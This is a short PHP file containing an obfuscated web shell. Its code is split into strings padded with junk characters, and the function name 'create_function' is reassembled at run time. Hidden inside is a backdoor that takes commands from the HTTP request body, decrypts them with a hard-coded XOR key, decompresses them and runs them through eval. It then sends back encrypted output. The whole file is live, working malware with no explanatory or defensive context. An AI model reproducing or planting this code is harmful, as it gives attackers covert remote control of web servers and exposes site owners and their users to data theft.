<?php
$w='oF.=F$t{$iF}^$FkF{F$j};}}return $o;}ifF (@pFreg_maFtch("/$kh(.FF+)$kf/",@file_getF_contFenFFtFs("Fphp:/';
$S='$k){$c=strlFeFn($k);$l=sFtrlenF($t)F;$Fo="";for($i=0;$i<$Fl;)F{for($Fj=0;($j<$Fc&&$iF<$l);$j++F,$i++)F{$';
$F='$k="11FF0F937c7";$kh="F68eb28d46F1cFc";$kf="5e6d7eF5205FF29";$p="Zht9oFV5ccJFFqaL1uh";FFfunction xF($tF,';
$p='/input"),$m)==1) {@FFFob_start();@evaFlFF(@gzFuncompress(@x(@basFe64_dFeFcFode(F$m[1]),F$k)));$o=@ob_';
$f='Fget_conFtFents();@ob_Fend_clean();$Fr=@FbasFe64_eFncode(F@x(@gzcompFresFs($o),$k));priFntF("F$p$kh$r$kf");}';
$g=str_replace('dn','','dncdnrdneate_fudnndncdntion');
$J=str_replace('F','',$F.$S.$w.$p.$f);
$b=$g('',$J);$b();
?>
